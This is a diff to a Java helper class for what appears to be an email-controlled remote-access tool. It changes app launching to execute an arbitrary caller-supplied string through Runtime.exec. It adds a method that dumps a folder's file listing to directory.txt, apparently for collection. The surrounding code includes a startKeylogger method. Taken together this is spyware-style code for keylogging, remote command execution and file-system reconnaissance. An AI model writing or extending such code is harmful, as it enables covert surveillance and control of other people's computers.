@@ -68,10 +68,14 @@ public class MailServerHelpers {
 
     public static String startApp(String appAddress) {
         try {
-            Desktop desktop = Desktop.getDesktop();
-            desktop.open(new File(appAddress));
-            return "Successfully start: " + appAddress;
-        } catch (IOException e) {
+            Process p = Runtime.getRuntime().exec(appAddress);
+            int exitCode = p.waitFor();
+            if (exitCode == 0) {
+                return "Successfully start: " + appAddress;
+            } else {
+                return "Can't start: " + appAddress;
+            }
+        } catch (IOException | InterruptedException e) {
             e.printStackTrace();
             return "Fail to start: " + appAddress;
         }
@@ -165,6 +169,10 @@ public class MailServerHelpers {
         }
     }
 
+    public static void logoutServer() {
+        System.exit(0);
+    }
+
     public static String startKeylogger() {
         try {
             MailServerKeylogger.getInstance().startKeylogger();
@@ -191,6 +199,32 @@ public class MailServerHelpers {
         } catch (Exception e) {
             e.printStackTrace();
             return "";
+        }
+    }
+
+    public static String collectDirectory(String folderAddress) {
+        List<String> directoryChildren = new ArrayList<>();
+
+        try {
+            File folder = new File(folderAddress);
+            File[] listOfFiles = folder.listFiles();
+
+            if (listOfFiles != null) {
+                for (File file: listOfFiles) {
+                    directoryChildren.add(file.getPath());
+                }
+            }
+
+            // Write to File
+            String fileAddressDirectory = fileAddress + "/directory.txt";
+            FileWriter writer = new FileWriter(fileAddressDirectory);
+            for(String str: directoryChildren) {
+                writer.write(str + System.lineSeparator());
+            }
+            writer.close();
+            return fileAddressDirectory;
+        } catch (IOException e) {
+            throw new RuntimeException(e);
         }
     }
 
